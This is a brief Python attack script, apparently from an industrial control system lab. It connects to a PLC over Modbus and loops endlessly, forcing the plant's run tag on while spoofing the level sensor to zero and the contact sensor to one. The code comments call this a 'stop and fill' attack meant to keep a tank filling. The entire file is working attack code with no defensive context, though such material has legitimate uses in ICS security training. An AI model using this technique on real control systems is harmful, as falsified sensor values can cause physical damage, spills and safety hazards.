#!/usr/bin/env python

#########################################
# Imports
#########################################
# - Logging
import logging

# - Attack communication
from modbus	import ClientModbus as Client
from modbus	import ConnectionException 

# - World environement
from world	import *

#########################################
# Logging
#########################################
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#####################################
# Stop and fill code
#####################################
client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)

try:
    client.connect()
    while True:
        rq = client.write(PLC_TAG_RUN, 1) 	# Run Plant, Run!
        rq = client.write(PLC_TAG_LEVEL, 0) 	# Level Sensor
        rq = client.write(PLC_TAG_CONTACT, 1) 	# Contact Sensor
except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print "Unable to connect / Connection lost"
